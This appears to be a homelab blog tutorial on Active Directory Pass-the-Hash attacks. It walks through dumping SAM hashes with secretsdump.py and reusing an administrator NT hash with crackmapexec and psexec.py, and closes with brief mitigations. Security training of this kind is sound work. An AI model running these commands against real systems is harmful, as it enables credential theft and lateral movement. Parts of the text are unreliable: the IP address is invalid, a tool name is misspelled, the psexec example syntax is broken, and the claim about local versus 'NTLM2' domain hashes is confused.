---
title: "Pass the Hash "
layout: post
category: Active-Directory
tags: [AD, Windows-server]
excerpt: " "
---


# Pass the Hash Overview

This **attack only works with local SAM hashes(NTLM)** and **not Domain hashes(NTLM2)**. Since many administrators use the same passwords for both local and domain accounts it is possible to login to a domain controller and other high value systems using only local hashes.

Pass the hash is a technique used to steal credentials and enable lateral movement within a target network. In Windows networks, the challenge-response model used by NTLM security is abused to enable a malicious user to authenticate as a valid domain user without knowing their password. Even though Kerberos has replaced NTLM as the preferred authentication method for Windows domains, NTLM is still enabled in many Windows domains for compatibility reasons. And so, pass the hash attacks remain an effective tool in the hands of skilled attackers.

## How NTLM authentication works  
1. The user enter his username and password.  
2. The client software generates a hash of password (and discards the cleartext password).  
3. The username is sent to the target system requesting authentication.  
4. A security challenge is returned which the client encrypts using the password hash and then sends back.  
5. The target system passes the encrypted response to the Domain Controller who also encrypts the challenge with its copy of the user’s password hash – if it matches then the user is authenticated

# Pass the Hash Attack
## Get NTLM Hash

- Installing crackmapexec  

```bash
apt install crackmapexec
```


- Dumping Hashes with secretsdump.py 

```bash
#secretsdump.py DC/username:password@DCip

secretsdump.py homelab.local/superman:'Password123!'@192.1168.1.2

```

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823175602.png){: }

- admin NTLM hash
- syntax  **(uid:rid:lmhash:nthash)**

```
Dumping local SAM hashes **(uid:rid:lmhash:nthash)**

Administrator:500:aad3b435b51404eeaad3b435b51404ee:3b5edb4ae7153d3871522857b2bd1e60


Administrator -> 3b5edb4ae7153d3871522857b2bd1e60
 
```


## # Pass NTLM Hash
- After get hash when perform [smb relay attack](https://seczone1.github.io/Active_Directory/2022-07-14-SMB-Relay-Attack) 

- using  crakmapexec Tool 
```bash

crakmapexec DC-IP -u "username" -H ntlm  --local

crakmapexec 192.168.1.2 -u Administrator -H 3b5edb4ae7153d3871522857b2bd1e60 --local

```

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823181748.png){: }


- Using Psexec Tool 

```bash
psexec.py "Username"@DC-IP -hashes Lmhash:NThash

psexec.py Administrator@192.168.1.2 Lmhash:NThash aad3b435b51404eeaad3b435b51404ee:3b5edb4ae7153d3871522857b2bd1e60

```

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823182002.png){: }


# Pass Hash Attack Mitigations  

Hard to completely prevent, but we can make it more difficult on an attacker:  
- Limit account re-use:  
- Avoid re-using local admin password  
- Disable Guest and Administrator accounts  
- Limit who is a local administrator (least privilege)  
- Utilize strong passwords:  
- The longer the better (>14 characters)  
- Avoid using common words  
- I like long sentences  
- Privilege Access Management (PAM)  
- Check out/in sensitive accounts when needed  
- Automatically rotate passwords on check out and check in  


